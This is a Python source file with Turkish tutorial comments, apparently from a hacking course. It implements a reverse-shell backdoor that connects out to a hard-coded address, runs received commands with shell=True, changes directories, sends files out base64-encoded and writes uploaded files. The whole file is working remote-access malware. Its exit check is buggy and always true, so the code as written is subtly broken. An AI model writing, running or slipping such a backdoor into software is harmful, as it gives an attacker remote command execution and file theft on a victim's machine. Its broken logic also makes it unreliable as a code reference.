# bind connection -> hedef bilgisayara kendi bilgisayarından bağlanmak
# reverse connection -> hedef bilgisayara bağlanmak için, hedef bilgisayarı kendi bilgisayarına bağlarsın
import socket
import subprocess
import json
import os
import base64
import simplejson
class MySocket:
    def __init__(self,ip,port):
        self.my_connection = socket.socket(socket.AF_INET,
                                      socket.SOCK_STREAM)  # bir instance oluşturuyoruz. 1 -> HANGİ AĞ AİLESİ 2 -> HANGİ YOLLA VERİLERİ TRANSFER EDECEKSİN

        self.my_connection.connect((ip, port))  # 1 -> verilerin gönderileceği ip adresi, 2 -> port numarası



    def json_send(self,data):
        json_data = simplejson.dumps(data)
        self.my_connection.send(json_data.encode("utf-8"))

    def json_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.my_connection.recv(1024).decode()
                return simplejson.loads(json_data)
            except ValueError:
                continue
    def command_execution(self,command):
        return subprocess.check_output(command, shell=True)  # shell = True komut bir string olarak gelecek dedik

    def execute_cd_command(self,directory):
        os.chdir(directory)
        return "Cd to " + directory
    def get_file_content(self,path):
        with open(path,"rb") as file: # rb -> binary modunda oku
            return base64.b64encode(file.read()) # -> encrypt ederek dosyayı indiriyourz

    def save_file(self,path,content):
        with open(path,"wb") as file:
            file.write(base64.b64decode(content))
            return "Download OK"
    def start_connection(self):
        while True:
            try:
                #command = self.my_connection.recv(1024)  # -> bağlantıdan bir veri al ve bu veri 1024 byte boyutunda

                command = self.json_receive()
                if command[0] == "exit" or "quit": # eğer gelen command listesinin ilk elemanı exit veya quit ise çıkış yap
                    self.my_connection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_output = self.execute_cd_command(command[1])
                elif command[0] == "download":
                    command_output = self.get_file_content(command[1])
                elif command[0] == "upload":
                    command_output = self.save_file(command[1],command[2])
                else:
                    command_output = self.command_execution(command)  # return ile dönen komutu da bir değişkene atıyoruz
               # self.my_connection.send(command_output)  # connection'a dönen değeri geri yolluyoruz
            except Exception:
                command_output = "Error!"
            self.json_send(command_output)
        self.my_connection.close()  # bağlantıyı kapatıyoruz


socket_my = MySocket("192.168.56.1", 8080)
socket_my.start_connection()